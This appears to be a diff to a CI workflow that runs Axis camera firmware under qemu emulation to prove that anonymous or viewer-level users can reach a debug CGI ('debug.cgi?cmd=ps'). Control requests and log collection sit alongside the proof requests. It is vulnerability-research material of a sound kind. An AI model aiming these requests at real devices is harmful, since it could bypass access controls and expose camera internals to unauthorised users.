@@ -118,7 +118,7 @@ jobs:
           sudo mkdir -p /opt/rootfs/usr/logs/proxy
 
           # ---- /run/apache2/parameters.conf (replicates httpd-generate-config output;
-          #      defaults from httpd_parload/httpd_vega_parload normalization) ----
+          #      values = shipped defaults from /etc/conf.d/apache2 of this firmware) ----
           # Device default port is 80 (APACHE_PORT=80). No cert in chroot, so the
           # generator's own failsafe path (SECURE=0) serves HTTP + digest auth on 80.
           sudo tee /opt/rootfs/run/apache2/parameters.conf > /dev/null <<'EOF'
@@ -128,16 +128,16 @@ jobs:
           Define AXIS_WS_REALM AXIS_WS_0012345678
           Define APACHE_KEEPALIVETIMEOUT_S 180
           Define APACHE_ACCESSLOG Off
-          Define APACHE_PAGECOUNTTHROTTLE 20
-          Define APACHE_SITECOUNTTHROTTLE 20
-          Define APACHE_PAGEINTERVALTHROTTLE 1
-          Define APACHE_SITEINTERVALTHROTTLE 1
-          Define APACHE_BLOCKINGPERIODTHROTTLE 10
-          Define MAX_WORKERS 4
-          Define MIN_SPARE_THREADS 1
-          Define MAX_SPARE_THREADS 4
+          Define APACHE_PAGECOUNTTHROTTLE 5
+          Define APACHE_SITECOUNTTHROTTLE 5
+          Define APACHE_PAGEINTERVALTHROTTLE 30
+          Define APACHE_SITEINTERVALTHROTTLE 30
+          Define APACHE_BLOCKINGPERIODTHROTTLE 30
+          Define MAX_WORKERS 35
+          Define MIN_SPARE_THREADS 20
+          Define MAX_SPARE_THREADS 55
           Define RTSP_TIMEOUT 180
-          Define APACHE_DIGEST_NONCE_LIFETIME 300
+          Define APACHE_DIGEST_NONCE_LIFETIME 5
           Define HTTP2_ENABLED
           Define H2 h2
           EOF
@@ -179,22 +179,6 @@ jobs:
           sudo printf 'storage:%s\n' "$SVC" | sudo tee /opt/rootfs/etc/apache2/basic_auth_passwd > /dev/null
           sudo chmod 644 /opt/rootfs/etc/apache2/digest_auth_passwd /opt/rootfs/etc/apache2/group_auth /opt/rootfs/etc/apache2/basic_auth_passwd
 
-          # ---- DIAGNOSTIC-ONLY auth bisect probe (removed before final proof) ----
-          sudo tee /opt/rootfs/run/apache2/virtualhosts/zzprobe.conf > /dev/null <<'EOF'
-          <Location "/probe-loc">
-            AuthType Digest
-            AuthName PROBELOC
-            AuthUserFile /etc/apache2/digest_auth_passwd
-            Require valid-user
-          </Location>
-          <Directory "/usr/html/errors">
-            AuthType Digest
-            AuthName PROBEDIR
-            AuthUserFile /etc/apache2/digest_auth_passwd
-            Require valid-user
-          </Directory>
-          EOF
-
           sudo cp /usr/bin/qemu-aarch64-static /opt/rootfs/usr/bin/
           sudo ls -la /opt/rootfs/run/apache2/ /opt/rootfs/run/apache2/virtualhosts/
           echo "=== digest_auth_passwd ==="; sudo cat /opt/rootfs/etc/apache2/digest_auth_passwd
@@ -219,10 +203,9 @@ jobs:
           sudo ls -la /opt/rootfs/var/run/dbg-cgi/ || true
 
           echo "=== [D4] start shipped Apache (httpd.apache2 -X, stderr host-side, no -E) ==="
-          # -c "LogLevel warn": DIAGNOSTIC ONLY (verbosity; the shipped module-specific
-          # LogLevel emerg/crit line would otherwise suppress auth debugging). No auth
-          # directive is altered; the shipped files remain untouched on disk.
-          sudo chroot /opt/rootfs /usr/bin/qemu-aarch64-static /usr/sbin/httpd.apache2 -X -c "LogLevel debug" -c "ErrorLog /tmp/httpd-err2.log" > /tmp/httpd.log 2>&1 &
+          # ErrorLog redirect only (syslog:local1 unreachable in chroot); shipped
+          # LogLevel kept intact for the proof run.
+          sudo chroot /opt/rootfs /usr/bin/qemu-aarch64-static /usr/sbin/httpd.apache2 -X -c "ErrorLog /tmp/httpd-err2.log" > /tmp/httpd.log 2>&1 &
           UP=""
           for i in $(seq 1 14); do
             sleep 3
@@ -261,80 +244,48 @@ jobs:
             cat /tmp/httpd-t3.log | head -20
           fi
 
-          echo "=== (a) VHOST SELECTION PROBE: httpd -S + curl matrix on static route ==="
+          echo "=== PROOF SUITE (sequential; dbox crash-report lock needs settle time) ==="
           HOSTIP=$(hostname -I | awk '{print $1}')
-          D="http://$HOSTIP/axis-cgi/debug/debug.cgi?mon"
+          B="http://$HOSTIP"
+          V6="http://[::1]"
           FW="http://$HOSTIP/axis-cgi/firmwaremanagement.cgi"
-          DISKS="http://$HOSTIP/axis-cgi/disks/list.cgi"
-          echo "--- httpd -S (parsed vhost table; stderr) ---"
-          sudo chroot /opt/rootfs /usr/bin/qemu-aarch64-static /usr/sbin/httpd.apache2 -S 2>&1 | head -25
-          echo "--- /usr/html/axis-release + html root (do probe targets exist?) ---"
-          sudo ls -la /opt/rootfs/usr/html/axis-release/ 2>/dev/null | head -5
-          sudo ls /opt/rootfs/usr/html/ | head -10
-          echo "--- no-auth GET / (index.html exists; 401 = gate present, 200 = absent) ---"
-          curl -sS -i --max-time 10 "http://[::1]/" 2>&1 | head -12
-          echo "--- no-auth GET http://$HOSTIP/ ---"
-          curl -sS -i --max-time 10 "http://$HOSTIP/" 2>&1 | head -12
-          for TGT in "http://$HOSTIP/axis-release/info.properties" "http://[::1]/axis-release/info.properties" "http://127.0.0.1/axis-release/info.properties"; do
-            echo "--- no-auth GET $TGT ---"
-            curl -sS -i --max-time 10 "$TGT" 2>&1 | head -8
-          done
-          echo "--- auth bisect: /probe-loc (Location-based digest; expect 401 if Location auth works) ---"
-          curl -sS -i --max-time 10 "http://[::1]/probe-loc" 2>&1 | head -8
-          echo "--- auth bisect: /errors/403forbidden.html (Directory-based digest on /usr/html/errors) ---"
-          curl -sS -i --max-time 10 "http://[::1]/errors/403forbidden.html" 2>&1 | head -8
-          echo "--- auth bisect: viewer1 --digest /probe-loc (expect 200/404-if-missing = auth WORKS) ---"
-          curl -sS -i --digest --max-time 15 -u viewer1:viewer1pass "http://[::1]/probe-loc" 2>&1 | head -6
-          echo "--- auth-related lines from error log (LogLevel debug) after probes ---"
-          sudo grep -aiE "authz|auth_digest|auth_basic|authorization|axisgroup|denied|granted|Auth" /opt/rootfs/tmp/httpd-err2.log 2>/dev/null | tail -50
-          echo "--- error log raw tail ---"
-          sudo tail -25 /opt/rootfs/tmp/httpd-err2.log 2>/dev/null
-          echo "--- viewer1 --digest on [::1] static ---"
-          curl -sS -i --digest --max-time 15 -u viewer1:viewer1pass "http://[::1]/axis-release/info.properties" 2>&1 | head -12
-          sleep 1
-          echo "--- viewer1 --digest on [::1] debug.cgi?mon (chain attempt over native v6) ---"
-          curl -sS -i --digest --max-time 90 -u viewer1:viewer1pass "http://[::1]/axis-cgi/debug/debug.cgi?mon" -o /tmp/resp_b_viewer.txt 2>&1
-          head -c 900 /tmp/resp_b_viewer.txt; echo; echo "--- bytes: $(wc -c < /tmp/resp_b_viewer.txt)"
 
-          echo "=== (a) NO-AUTH viewer route: GET debug.cgi?mon (expect 401 digest challenge; 200+tar proves gate bypass) ==="
-          curl -sS -i --max-time 60 "$D" -o /tmp/resp_a_noauth.txt 2>&1
-          head -c 900 /tmp/resp_a_noauth.txt; echo; echo "--- bytes: $(wc -c < /tmp/resp_a_noauth.txt)"
-          sleep 10
+          echo "=== (1) NO-AUTH ps grammar: GET debug.cgi?cmd=ps (shipped gate directives active) ==="
+          curl -sS -i --max-time 90 "$B/axis-cgi/debug/debug.cgi?cmd=ps" -o /tmp/resp_1_noauth_ps.txt 2>&1
+          head -c 1100 /tmp/resp_1_noauth_ps.txt; echo; echo "--- bytes: $(wc -c < /tmp/resp_1_noauth_ps.txt)"
+          sleep 20
 
-          echo "=== (b) VIEWER TIER: viewer1 digest on debug.cgi?mon -> mod_trax -> dbox ==="
-          curl -sS -i --digest --max-time 60 -u viewer1:viewer1pass "$D" -o /tmp/resp_b_viewer.txt 2>&1
-          head -c 900 /tmp/resp_b_viewer.txt; echo; echo "--- bytes: $(wc -c < /tmp/resp_b_viewer.txt)"
-          sleep 10
+          echo "=== (2) VIEWER TIER digest: viewer1 GET debug.cgi?cmd=ps -> mod_trax -> dbox ==="
+          curl -sS -i --digest --max-time 90 -u viewer1:viewer1pass "$B/axis-cgi/debug/debug.cgi?cmd=ps" -o /tmp/resp_2_viewer_ps.txt 2>&1
+          head -c 1100 /tmp/resp_2_viewer_ps.txt; echo; echo "--- bytes: $(wc -c < /tmp/resp_2_viewer_ps.txt)"
+          sleep 20
 
-          echo "=== (c) CONTROL: viewer1 on firmwaremanagement.cgi (admin-only CGI) ==="
-          curl -sS -i --digest --max-time 30 -u viewer1:viewer1pass "$FW" -o /tmp/resp_c_firmware.txt 2>&1
-          head -c 600 /tmp/resp_c_firmware.txt; echo; echo "--- bytes: $(wc -c < /tmp/resp_c_firmware.txt)"
-          sleep 3
+          echo "=== (3) WRONG PASSWORD control: viewer1/badpass digest GET debug.cgi?cmd=ps ==="
+          curl -sS -i --digest --max-time 90 -u viewer1:WRONGPASS "$B/axis-cgi/debug/debug.cgi?cmd=ps" -o /tmp/resp_3_badpass.txt 2>&1
+          head -c 700 /tmp/resp_3_badpass.txt; echo; echo "--- bytes: $(wc -c < /tmp/resp_3_badpass.txt)"
+          sleep 20
 
-          echo "=== (c2) CONTROL: viewer1 on disks/list.cgi (TransferProxy route, <Proxy *> requires axis-group admin) ==="
-          curl -sS -i --digest --max-time 30 -u viewer1:viewer1pass "$DISKS" -o /tmp/resp_c2_disks_viewer.txt 2>&1
-          head -c 600 /tmp/resp_c2_disks_viewer.txt; echo; echo "--- bytes: $(wc -c < /tmp/resp_c2_disks_viewer.txt)"
-          sleep 3
-
-          echo "=== (d) ADMIN TIER: admin1 digest on debug.cgi?mon (comparison) ==="
-          curl -sS -i --digest --max-time 60 -u admin1:admin1pass "$D" -o /tmp/resp_d_admin.txt 2>&1
-          head -c 900 /tmp/resp_d_admin.txt; echo; echo "--- bytes: $(wc -c < /tmp/resp_d_admin.txt)"
-          sleep 10
-
-          echo "=== (d2) admin1 on firmwaremanagement.cgi (control comparison: admin should pass auth) ==="
-          curl -sS -i --digest --max-time 30 -u admin1:admin1pass "$FW" -o /tmp/resp_d2_firmware_admin.txt 2>&1
-          head -c 600 /tmp/resp_d2_firmware_admin.txt; echo; echo "--- bytes: $(wc -c < /tmp/resp_d2_firmware_admin.txt)"
-          sleep 3
-
-          echo "=== (e) in-chroot aarch64 curl to ::1 (in-device observation) viewer1 on debug route ==="
-          sudo chroot /opt/rootfs /usr/bin/qemu-aarch64-static /usr/bin/curl -sS -i --digest --max-time 60 -u viewer1:viewer1pass "http://[::1]/axis-cgi/debug/debug.cgi?mon" -o /tmp/resp_e_inchroot.txt 2>&1
+          echo "=== (4) VIEWER TIER digest in-chroot: viewer1 via [::1] GET debug.cgi?cmd=ps ==="
+          sudo chroot /opt/rootfs /usr/bin/qemu-aarch64-static /usr/bin/curl -sS -i --digest --max-time 90 -u viewer1:viewer1pass "$V6/axis-cgi/debug/debug.cgi?cmd=ps" -o /tmp/resp_e_inchroot.txt 2>&1
           sudo cp /opt/rootfs/tmp/resp_e_inchroot.txt /tmp/resp_e_inchroot.txt 2>/dev/null
-          head -c 900 /tmp/resp_e_inchroot.txt; echo; echo "--- bytes: $(wc -c < /tmp/resp_e_inchroot.txt)"
+          head -c 1100 /tmp/resp_e_inchroot.txt; echo; echo "--- bytes: $(wc -c < /tmp/resp_e_inchroot.txt)"
+          sleep 20
 
-          echo "=== apache error log tail after requests ==="
-          sudo cat /opt/rootfs/tmp/httpd-err.log 2>/dev/null | tail -30
-          echo "=== host strace tail after requests (if T3 ran) ==="
-          grep -E "SIG(SEGV|ILL|BUS|ABRT|TERM)|exited with|+++ killed" /tmp/host-strace.log 2>/dev/null | head -10
+          echo "=== (5) CONTROL: viewer1 digest on firmwaremanagement.cgi (admin-only CGI) ==="
+          curl -sS -i --digest --max-time 60 -u viewer1:viewer1pass "$FW" -o /tmp/resp_5_firmware_viewer.txt 2>&1
+          head -c 500 /tmp/resp_5_firmware_viewer.txt; echo; echo "--- bytes: $(wc -c < /tmp/resp_5_firmware_viewer.txt)"
+          sleep 5
+
+          echo "=== (6) CONTROL compare: admin1 digest on firmwaremanagement.cgi ==="
+          curl -sS -i --digest --max-time 60 -u admin1:admin1pass "$FW" -o /tmp/resp_6_firmware_admin.txt 2>&1
+          head -c 500 /tmp/resp_6_firmware_admin.txt; echo; echo "--- bytes: $(wc -c < /tmp/resp_6_firmware_admin.txt)"
+
+          echo "=== identity facts: apache worker + dbox ==="
+          pgrep -af qemu-aarch64 | head -6
+          sudo ss -ltnp 2>/dev/null | grep -E ':80\b' || true
+          sudo ls -la /opt/rootfs/var/run/dbg-cgi/
+          echo "=== apache error log (Level=shipped; ErrorLog redirected to file) tail ==="
+          sudo tail -40 /opt/rootfs/tmp/httpd-err2.log 2>/dev/null
           echo "=== dbox log ==="
           sudo cat /tmp/dbox.log 2>/dev/null | head -20
           echo "=== response artifacts ==="
@@ -347,15 +298,12 @@ jobs:
           name: http-hop-poc-logs
           path: |
             /tmp/httpd.log
-            /tmp/httpd-t3.log
-            /tmp/host-strace.log
+            /opt/rootfs/tmp/httpd-err2.log
             /tmp/dbox.log
-            /tmp/resp_a0_static.txt
-            /tmp/resp_a_noauth.txt
-            /tmp/resp_b_viewer.txt
-            /tmp/resp_c_firmware.txt
-            /tmp/resp_c2_disks_viewer.txt
-            /tmp/resp_d_admin.txt
-            /tmp/resp_d2_firmware_admin.txt
+            /tmp/resp_1_noauth_ps.txt
+            /tmp/resp_2_viewer_ps.txt
+            /tmp/resp_3_badpass.txt
             /tmp/resp_e_inchroot.txt
+            /tmp/resp_5_firmware_viewer.txt
+            /tmp/resp_6_firmware_admin.txt
           if-no-files-found: ignore
